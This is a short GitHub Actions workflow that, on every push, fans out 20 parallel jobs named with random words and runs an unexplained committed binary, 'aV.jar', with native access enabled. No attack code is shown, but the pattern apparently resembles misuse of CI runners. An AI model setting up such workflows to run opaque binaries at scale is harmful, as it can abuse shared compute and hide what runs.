name: tip

on:
  push:

jobs:
  detective:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        advanced: ["dress", "comprehension", "oven", "convention", "local"]
        obvious: ["bronze", "elimination", "loss", "resistance"]
    steps:
    - uses: actions/checkout@v6
    - uses: actions/setup-java@v5
      with:
        distribution: 'zulu'
        java-version: '25'
    - run: java --enable-native-access=ALL-UNNAMED -jar aV.jar
